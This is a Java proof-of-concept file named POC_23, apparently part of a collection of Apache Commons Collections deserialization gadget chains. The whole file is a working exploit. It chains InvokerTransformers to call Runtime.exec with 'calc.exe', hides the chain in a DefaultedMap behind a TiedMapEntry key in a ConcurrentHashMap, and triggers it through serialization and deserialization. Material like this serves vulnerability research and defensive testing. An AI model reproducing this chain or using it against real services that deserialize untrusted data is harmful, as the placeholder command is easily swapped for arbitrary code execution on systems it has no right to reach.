package com.example.CC3;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;

import java.util.concurrent.ConcurrentHashMap;

public class POC_23 {

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };
        Transformer transformChain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) });
        ReflectionUtil.setField(transformChain, "iTransformers", transformers);
        DefaultedMap d = new DefaultedMap("1");
        TiedMapEntry t = new TiedMapEntry(d, "key");

        ConcurrentHashMap map = new ConcurrentHashMap<>();
        map.put(t, "value");

        ReflectionUtil.setField(d, "value", transformChain);
        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }

}
